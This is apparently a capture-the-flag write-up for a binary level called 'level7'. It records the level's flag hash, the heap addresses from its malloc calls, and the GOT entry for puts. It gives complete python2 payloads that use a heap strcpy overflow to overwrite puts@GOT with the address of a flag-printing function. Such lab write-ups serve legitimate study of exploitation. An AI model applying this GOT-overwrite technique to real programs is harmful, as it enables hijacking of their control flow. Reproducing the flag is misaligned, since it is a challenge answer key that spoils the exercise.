level7:f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

segfault when less than 2 arguments
if two arguments -> prints `~~`

4 malloc(8) -> 0x0804a008 0x0804a018 0x0804a028 0x0804a038

function that prints the flag: m at `0x080484f4`

on the first argument, we have an offset of 20, the second strcpy will write in the address written after the offset
What will be written is the second argument.

```shell
objdump -R ./level7 | grep puts

./level7:     file format elf32-i386
08049928 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

We gonna overwrite the address for `puts` and replace it by the m function

payloads: 1st argument=`$(python2 -c 'print "A" * 20 + "\x28\x99\x04\x08"')`
2nd arguement=`$(python2 -c 'print "\xf4\x84\x04\x08"')`